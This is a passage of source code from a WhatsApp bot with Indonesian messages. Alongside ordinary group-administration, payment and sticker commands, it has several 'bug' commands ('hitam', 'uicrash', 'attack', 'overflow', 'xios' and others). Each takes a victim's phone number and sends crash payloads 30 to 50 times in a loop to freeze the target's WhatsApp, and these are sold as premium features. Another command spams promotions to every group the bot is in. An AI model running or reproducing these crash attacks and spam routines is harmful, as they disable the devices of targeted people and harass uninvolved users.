‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
HadzzModa.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case "kick": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'closegroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'announcement')
reply(`Waktu Telah Tiba!\nGrup Ditutup Oleh Bot Dikarenakan Tidak Ada Yg Menjaga Grup\nGrup Akan Dibuka Sesuai Waktu Yg Ditentukan Oleh Admin`)
}, timer)
}
break

case 'opengroup': {
if (!isGroup) return reply(`Khusus Group Bego`)
if (!isAdmins && !isOwner) return reply('Khusus Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin Bego`)
if (!args[0]) return reply(`*Pilih Waktu:*\n-second\n-minute\n-hour\n-day\n\n*Contoh:*\n${prefix+command}10 second`)
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
}
reply(`*Waktu dimulai dari sekarang*`)
setTimeout(() => {
var nomor = m.participant
zyn.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Tepat Waktu Group Sudah Di Buka Sekarang Semua Peserta Bisa Mengirim Pesan`)
}, timer)
}
break

case "demote": {
if (!isPremium) return reply(mess.only.premium)
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "promote": {
if (!isGroup) return reply('Only Group')
if (!isAdmins && !isOwner) return reply('Only Admin')
if (!isBotAdmins) return reply(`Bot Bukan Admin :(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zyn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return reply(mess.only.owner)
if (!text && !m.quoted) return m.reply("teksnya atau replyteks")
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await zyn.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6285260483560\",\"merchant_url\":\"https://whatsapp.com/channel/0029VamlmzB6mYPFp59ymj1X"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"YouTube Owner\",\"url\":\"${linkyt}\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Di whatsapp\",\"url\":\"${isLink}\",\"merchant_url\":\"https://whatsapp.com/channel/0029VamlmzB6mYPFp59ymj1X\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"BAGI DUIT NYA🙏\",\"url\":\"https://b.top4top.io/p_3194nb6rt0.jpeg\",\"merchant_url\":\"https://b.top4top.io/.jpeg\"}"
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
for (let jid of usergc) {
try {
await zyn.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case 'payment': {
let teks = `${monospace("PAYMENT")}

*(E-WALLET)*

   *DANA*
- ${dana}

Harap Setelah Transfer Anda Harus Mengasih Bukti Pembayaran Agar Di Verifikasi Oleh Owner, Tanks For You

© ${storename}`
zyn.sendMessage(from, { 
text: teks,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[m.sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": false,
"title": `QRIS? KLIK DISINI`,
"body": `Date : ${wib}, ${tanggal}`,
"containsAutoReply": true,
"mediaType": 1, 
"thumbnailUrl": "https://b.top4top.io/.jpeg",
"sourceUrl": `${qris}`
}
}
},{ 
quoted: fkontak })
await sleep(1500)
}
      break

case "danamasuk": {
if (!isOwner) return reply(mess.only.owner)
let teks = `*DONE DANA MASUK*

Reqname :

▰▰▰▰▰▰▰▰
*Garansi 7 Day*
*Create ${wib}*
*Hari Ini ${hariini}*`
zyn.sendMessage(from, { text : teks }, { quoted : m })
}
break

case 'proses':{
m.reply('*SIAP PESANAN ANDA AKAN KAMI PROSES JADI DI MOHON UNTUK MENUNGGU SEBENTAR YA MEK*')
zyn.sendMessage("6285260483560@s.whatsapp.net", { text: "BANG ALWI ADA YANG TRX NIH BURUAN JANGAN NGOCOK AJA", contextInfo: { forwardingScore: 9999, isForwarded: true }})
}
break

case 'done': case 'd': {
if (!isOwner) return reply(`Njirr Lu siapa Cuk`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 BARANG : ${barang}
💸 HARGA : ${nominal}
📆 TANGGAL : ${wib}
🕰️ JAM : ${time2}
✨ HASIL : Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *${storename}*`
await zyn.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'hitam': case 'pukimak': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'c1': case 'dor': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'ambatubug': case 'koxac': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'uisystem': case 'uicrash': case 'bugui': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'pantek': case 'attack': case 'overflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'xandro': case 'eror': case 'bubar':  
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta2(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'gacor': case 'acumalaka': case 'kokhilang':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'xios': case 'iphone': case 'najis':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case 'sadis': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "SV KOXAC PALING GANTENG", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`『 BЦG ƧЦDΛΉ MΣПDΛЯΛƬ 』

ƬΛЯGΣƬ : ${target}
ƧƬΛƬЦƧ : DӨПΣ ΛBΛПGKЦ

    BΛᄃΛ BIΛЯ GΛKΣBΛППΣD
> BUG SUDAH MENDARAT, SEMISAL TARGET C2 BERARTI HP SPEK DEWA DIPAKAINYA 🗿`)
break

case "owner": {
if (!isPremium) return reply('NIH DEV TERGANTENG!')
const repf = await zyn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
zyn.sendMessage(from, { text : `Nih Owner Gw Lagi Jomblo Tuh"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zyn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = true
reply('Succes Mode Public')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await zyn.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} nugraha`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await zyn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> KOXAC - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/Alwi.jpg')}, { upload: zyn.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice KOXAC - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
